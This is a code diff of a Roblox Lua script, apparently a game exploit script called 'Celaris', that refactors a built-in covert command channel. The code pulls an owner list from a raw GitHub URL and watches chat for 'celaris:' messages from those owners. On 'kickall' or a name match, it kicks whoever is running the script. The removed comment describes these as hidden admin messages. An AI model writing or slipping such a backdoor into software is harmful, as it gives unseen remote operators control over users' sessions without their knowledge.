@@ -12,11 +12,11 @@ end
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
-
 local ChatEvent = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
 
--- Admin check
+-- Admins who can kick and talk (GitHub-based)
 local HttpService = game:GetService("HttpService")
+
 local function getOwners()
 	local success, result = pcall(function()
 		return HttpService:GetAsync("https://raw.githubusercontent.com/exlehskee/808s/refs/heads/main/AdminAllowed")
@@ -27,50 +27,41 @@ local function getOwners()
 	return {}
 end
 
-local function isOwner(user)
-	local list = getOwners()
-	for _, v in pairs(list) do
-		if v:lower() == user:lower() then
+local function isOwner(username)
+	local owners = getOwners()
+	for _, v in pairs(owners) do
+		if v:lower() == username:lower() then
 			return true
 		end
 	end
 	return false
 end
 
--- Find player from name fragment
-local function findPlayer(str)
-	str = str:lower()
-	for _, plr in ipairs(Players:GetPlayers()) do
-		if plr ~= LocalPlayer and (plr.Name:lower():find(str) or plr.DisplayName:lower():find(str)) then
-			return plr
-		end
-	end
-	return nil
+-- Helper to match a player by partial name
+local function matchesLocalPlayer(arg)
+	local lcArg = arg:lower()
+	return LocalPlayer.Name:lower():find(lcArg) or LocalPlayer.DisplayName:lower():find(lcArg)
 end
 
--- Listen for hidden admin messages
-ChatEvent.OnClientEvent:Connect(function(msgData)
-	local speaker = msgData.FromSpeaker
-	local message = msgData.Message
+-- Main listener
+ChatEvent.OnClientEvent:Connect(function(msg)
+	local sender = msg.FromSpeaker
+	local message = msg.Message
 
-	if not isOwner(speaker) then return end
+	if not isOwner(sender) then return end
 	if not message:lower():match("^celaris:") then return end
 
-	local cmd = message:sub(9) -- remove "celaris:"
+	local command = message:sub(9):lower() -- remove "celaris:"
 
-	if cmd == "kickall" then
-		LocalPlayer:Kick("Celaris | Admin removed you.")
-	elseif cmd:sub(1, 4) == "kick" then
-		local arg = cmd:sub(6)
-		local plr = findPlayer(arg)
-		if plr and plr == LocalPlayer then
-			LocalPlayer:Kick("Celaris | Admin removed you.")
+	if command == "kickall" then
+		LocalPlayer:Kick("Celaris | Removed by Admin.")
+	elseif command:sub(1, 4) == "kick" then
+		local target = command:sub(6)
+		if matchesLocalPlayer(target) then
+			LocalPlayer:Kick("Celaris | Removed by Admin.")
 		end
 	end
 end)
-
-
-
 
 -- Executor Check
 local function BadExecutors()
